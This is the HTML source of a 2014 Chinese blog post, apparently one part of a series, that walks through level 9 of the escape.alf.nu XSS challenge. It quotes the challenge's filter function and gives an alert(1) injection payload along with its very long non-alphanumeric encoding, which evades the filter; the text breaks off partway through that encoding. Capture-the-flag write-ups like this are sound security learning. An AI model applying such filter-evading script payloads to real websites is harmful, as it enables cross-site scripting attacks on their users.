<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>escape-Write-ups (Part 2) | evilddog&#39;s blog</title>
  <meta name="author" content="evilddog">
  
  <meta name="description" content="be quieter">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="escape-Write-ups (Part 2)"/>
  <meta property="og:site_name" content="evilddog&#39;s blog"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/favicon.png" rel="icon">
  <link rel="alternate" href="/rss.xml" title="evilddog&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="/js/jquery.min.js"></script>
  
<script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-56327794-1', 'auto');
  ga('send', 'pageview');

</script>


</head>


<body>
  <!--[if lte IE 8]> <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'> <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode"><img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0027_Simplified Chinese.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." style='margin-left:auto;margin-right:auto;display: block;'/></a></div> <![endif]-->
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">evilddog&#39;s blog</a></h1>
  <h2><a href="/">在一群出色的人中间,误以为自己也是其中一员,然后忘了努力</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/404.html">404</a></li>
    
      <li><a href="/about">About</a></li>
    
      <li><a href="/rss.xml">RSS</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <time datetime="2014-10-12T06:00:47.000Z"><a href="/2014/10/12/escape-alf-nu-write-ups-2/">10月 12 2014</a></time>
      
      
  
    <h1 class="title">escape-Write-ups (Part 2)</h1>
  

    </header>
    <div class="entry">
      
        <hr>

<h2 id="前言">前言</h2>
<p>这是接<a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">上一篇</a>的Write-up</p>
<a id="more"></a>

<h2 id="原文">原文</h2>
<h3 id="Level_9:">Level 9:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</span></span></div><div class="line">	<span class="comment">// This is sort of a spoiler for the last level :-)</span></div><div class="line">	<span class="keyword">if</span> (<span class="regexp">/[\\&lt;&gt;]/</span>.test(s)) <span class="keyword">return</span> <span class="string">'-'</span>;</div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>';</div><div class="line">}</div></pre></td></tr></table></figure>

<p>Some as level 8 but now we cannot use angle brackets (&lt;&gt;) nor backslashes ()</p>
<p>Solutions:</p>
<p>Is it possible to use an online non-alphanumeric encoder to encode the following payload so it uses no alpha characters, angle brackets (&lt;&gt;) nor backslashes ()</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+<span class="function">alert</span>(1))<span class="comment">//</span></div></pre></td></tr></table></figure>

<p>Producing a huge solution (5627):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!!	[<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]])())[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]])()([<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]])())[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]])()(([<span class="link_label"></span>]+{})[<span class="link_label">+[</span>]])[<span class="link_label">+[</span>]]+(!+[<span class="link_label"></span>]+!![<span class="link_label"></span>]+[<span class="link_label"></span>])+(!+[<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+[<span class="link_label"></span>]))+(+!![<span class="link_label"></span>]+[<span class="link_label"></span>])+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]])())[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]])()([<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span 